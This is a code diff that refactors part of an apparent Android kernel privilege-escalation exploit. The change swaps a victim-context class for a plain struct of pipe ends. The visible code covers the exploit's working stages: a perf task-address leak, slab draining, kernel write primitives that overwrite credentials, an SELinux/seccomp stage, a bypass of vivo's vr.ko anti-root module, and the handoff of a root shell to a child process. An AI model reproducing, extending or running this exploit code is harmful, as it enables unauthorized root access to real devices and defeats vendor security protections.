@@ -9,7 +9,6 @@
 #include "routes/route_controller.h"
 #include "profile.h"
 #include "session/handoff_probe.hpp"
-#include "session/victim_context.hpp"
 #include "support/native_resource.hpp"
 #include <array>
 #include <ctype.h>
@@ -964,6 +963,19 @@ static uintptr_t perf_find_task(void) {
     return best;
 }
 
+/* Owns the six pipe ends of the victim protocol. The child-side ends are
+ * closed by the fork child before child_main runs; the parent-side ends are
+ * closed once their protocol step is done. parked_cmd_w below receives the
+ * cmd write end by move when a rooted child is parked across W3 rounds. */
+struct child_pipes {
+    ghostlock::UniqueFd task_read;
+    ghostlock::UniqueFd cmd_write;
+    ghostlock::UniqueFd uid_read;
+    ghostlock::UniqueFd task_write;
+    ghostlock::UniqueFd cmd_read;
+    ghostlock::UniqueFd uid_write;
+};
+
 /* rooted exits kfree the static init_cred (w2 stores it with no
  * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
 /* Decoupling plan: retain a rooted child that references the credential.
@@ -981,7 +993,7 @@ static void park_rooted_child(void) {
 /* Decoupling plan: execute the victim command protocol and root handoff.
  * Input: owned pipe endpoints plus runtime config; output: reports/child exit.
  * Future: victim_child_run(VictimContext *), with explicit fd ownership. */
-static void child_main(ghostlock::VictimContext *p) {
+static void child_main(struct child_pipes *p) {
     p->task_read.reset();
     p->cmd_write.reset();
     p->uid_read.reset();
@@ -1117,7 +1129,7 @@ static void child_main(ghostlock::VictimContext *p) {
 
 /* Decoupling plan: create the victim process and pipe protocol. Input/output:
  * VictimContext; output: owned PID/error. Future: victim_context_spawn(). */
-static pid_t spawn_child(ghostlock::VictimContext *p) {
+static pid_t spawn_child(struct child_pipes *p) {
     int p1[2], p2[2], p3[2];
     if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
     p->task_read.reset(p1[0]);
@@ -1135,7 +1147,6 @@ static pid_t spawn_child(ghostlock::VictimContext *p) {
     p->task_write.reset();
     p->cmd_read.reset();
     p->uid_write.reset();
-    p->set_child(child);
     return child;
 }
 
@@ -1143,7 +1154,7 @@ static pid_t spawn_child(ghostlock::VictimContext *p) {
 /* Decoupling plan: spawn a victim and obtain its task address. Inputs:
  * VictimContext/output address; output: PID/error. Future:
  * victim_context_prepare(VictimContext *, uintptr_t *). */
-static pid_t spawn_victim(ghostlock::VictimContext *p, uintptr_t *task_out) {
+static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
     pid_t child = spawn_child(p);
     if (child < 0) return -1;
     uintptr_t task = 0;
@@ -1245,11 +1256,11 @@ static int verify_selinux_stage(void *context) {
 }
 
 struct w2_stage_context {
-    ghostlock::VictimContext *pipes;
+    struct child_pipes *pipes;
 };
 
 struct w3_stage_context {
-    ghostlock::VictimContext *pipes;
+    struct child_pipes *pipes;
     int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
 };
 
@@ -1467,8 +1478,9 @@ int run_exploit(int argc, char **argv) {
     slab_drain();
     TIMER("pre-W2 drain");
 
-    ghostlock::VictimContext victim;
-    struct w2_stage_context w2_context = {.pipes = &victim};
+    struct child_pipes pipes;
+    struct w2_stage_context w2_context = {.pipes = &pipes};
+    pid_t child = -1;
     uintptr_t child_task = 0;
     int child_alive = 1;
     int seccomp_ok = 0;
@@ -1483,20 +1495,21 @@ int run_exploit(int argc, char **argv) {
         if (round > 1) {
             pr_warning("W3 chain retry %d/%d: parking rooted child\n",
                     round, chain_rounds);
-            if (victim.child() > 0 && child_alive) {
-                write(victim.cmd_write.get(), "P", 1);
+            if (child > 0 && child_alive) {
+                write(pipes.cmd_write.get(), "P", 1);
                 usleep(50000);
-                parked_child = victim.release_child();
-                parked_cmd_w = std::move(victim.cmd_write);
+                parked_child = child;
+                parked_cmd_w = std::move(pipes.cmd_write);
             } else {
-                victim.cmd_write.reset();
+                pipes.cmd_write.reset();
             }
-            victim.uid_read.reset();
+            pipes.uid_read.reset();
             child_alive = 1;
             seccomp_ok = 0;
         }
 
-        if (spawn_victim(&victim, &child_task) < 0) {
+        child = spawn_victim(&pipes, &child_task);
+        if (child < 0) {
             pr_warning("fork failed\n");
             return 1;
         }
@@ -1505,20 +1518,17 @@ int run_exploit(int argc, char **argv) {
         if (!child_task) {
             /* nothing rooted yet; safe to kill and burn a round */
             pr_warning("perf leak did not reproduce; retrying next round\n");
-            const pid_t unrooted = victim.release_child();
-            if (unrooted > 0) {
-                kill(-unrooted, SIGKILL);
-                waitpid(unrooted, NULL, 0);
-            }
+            kill(-child, SIGKILL);
+            waitpid(child, NULL, 0);
 
             child_alive = 0;
-            victim.cmd_write.reset();
-            victim.uid_read.reset();
+            pipes.cmd_write.reset();
+            pipes.uid_read.reset();
             continue;
 
         }
 
-        pr_info("child_pid=%d child_task=0x%016zx\n", victim.child(), child_task);
+        pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
 #ifdef VR_TAG_A_OFF
         /* ------------------------------------------------------------------
          * vivo vr.ko anti-root per-task bypass (ported from root.c)
@@ -1584,12 +1594,12 @@ int run_exploit(int argc, char **argv) {
                 execution_settings()->w2_settle_us,
                 verify_w2_stage, &w2_context, 0);
         if (!got_root) {
-            write(victim.cmd_write.get(), "X", 1);
-            victim.cmd_write.reset();
-            victim.uid_read.reset();
+            write(pipes.cmd_write.get(), "X", 1);
+            pipes.cmd_write.reset();
+            pipes.uid_read.reset();
             pr_warning("W2 failed after %u rounds\n",
                     execution_settings()->w2_attempts);
-            waitpid(victim.child(), NULL, WNOHANG);
+            waitpid(child, NULL, WNOHANG);
             return 1;
         }
         ever_rooted = 1;
@@ -1610,7 +1620,7 @@ int run_exploit(int argc, char **argv) {
 
         int tcp_writes = tcp_route_selected();
         struct w3_stage_context w3_context = {
-                .pipes = &victim,
+                .pipes = &pipes,
                 .leaf_to_target8 = !tcp_writes,
         };
         if (!tcp_writes) {
@@ -1652,9 +1662,8 @@ int run_exploit(int argc, char **argv) {
             }
             usleep(execution_settings()->w3_settle_us);
             int st = 0;
-            if (waitpid(victim.child(), &st, WNOHANG) == victim.child()) {
+            if (waitpid(child, &st, WNOHANG) == child) {
                 pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
-                victim.mark_child_exited();
                 child_alive = 0;
                 break;
             }
@@ -1689,14 +1698,13 @@ int run_exploit(int argc, char **argv) {
     }
     if (child_alive) {
         errno = 0;
-        const ssize_t sent = write(victim.cmd_write.get(), "G", 1);
-        pr_info("handoff: child=%d alive=%d sent=%zd errno=%d\n", victim.child(),
+        const ssize_t sent = write(pipes.cmd_write.get(), "G", 1);
+        pr_info("handoff: child=%d alive=%d sent=%zd errno=%d\n", child,
                 child_alive, sent, errno);
         if (sent != 1)
             pr_warning("failed to start root shell (child exited early)\n");
-        victim.cmd_write.reset();
-        waitpid(victim.child(), NULL, WNOHANG);
-        (void) victim.release_child();
+        pipes.cmd_write.reset();
+        waitpid(child, NULL, WNOHANG);
         parked_cmd_w.reset();
     } else if (parked_child > 0) {
         if (write(parked_cmd_w.get(), "G", 1) != 1)
@@ -1706,7 +1714,7 @@ int run_exploit(int argc, char **argv) {
     } else {
         pr_warning("skipping late-load: child died during W3\n");
     }
-    victim.uid_read.reset();
+    pipes.uid_read.reset();
 
     ghostlock::HandoffPollPolicy handoff_policy;
     handoff_policy.module_poll_attempts =
